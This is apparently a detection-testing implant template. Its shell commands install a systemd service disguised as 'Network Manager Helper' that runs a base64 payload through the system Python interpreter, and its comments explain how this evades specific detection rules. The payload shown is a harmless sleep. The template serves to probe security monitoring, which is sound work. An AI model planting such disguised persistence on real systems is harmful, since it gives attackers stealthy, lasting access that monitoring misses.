# Implant template: apt-systemd-lolbin-packaged (L5, armed)
#
# APT TTP mirror: ESXi/Linux ransomware & APT29-style "blend-in" systemd
# persistence. A persistent .service whose ExecStart is a PACKAGED LOLBin
# (/usr/bin/python3) running an inline -c payload that re-spawns from a
# base64 blob held in an EnvironmentFile. No path under /tmp, no orphan,
# no non_package: every referenced path is owned by a real package and
# the unit content is generic-looking. This is the evade-fleetwide-clean
# class EXTENDED with shell_indirect: the interpreter is packaged, the
# real command hides inside -c, and the agent's systemd module will set
# exec_target=/usr/bin/python3 (managed) -> NO non_package, NO orphan,
# NO interpreter_in_tmp. shell_indirect fires (python3 is an interpreter)
# but NO detection rule consumes shell_indirect, so Q7 is silent. Per-host
# the EnvironmentFile blob is unique-ish but the UNIT itself can be made
# byte-identical fleet-wide -> Q1 misses on the unit. The finding: a
# packaged-interpreter ExecStart with an inline payload is the durable
# blind spot.
#
# Variables: ${unit_file}, ${env_file}

RUN mkdir -p /etc/systemd/system /etc/sysconfig && \
    printf '%s\n' \
        '# managed by config (DO NOT EDIT)' \
        'AGENT_OPTS=aW1wb3J0IHRpbWU7IHRpbWUuc2xlZXAoMzYwMCk=' \
        > ${env_file} && \
    chown root:root ${env_file} && \
    chmod 0644 ${env_file} && \
    printf '%s\n' \
        '[Unit]' \
        'Description=Network Manager Helper' \
        'After=network.target' \
        '[Service]' \
        'Type=simple' \
        'EnvironmentFile=${env_file}' \
        'ExecStart=/usr/bin/python3 -c "import base64,os; exec(base64.b64decode(os.environ[\"AGENT_OPTS\"]))"' \
        'Restart=always' \
        'RestartSec=60' \
        '[Install]' \
        'WantedBy=multi-user.target' \
        > ${unit_file} && \
    chown root:root ${unit_file} && \
    chmod 0644 ${unit_file}
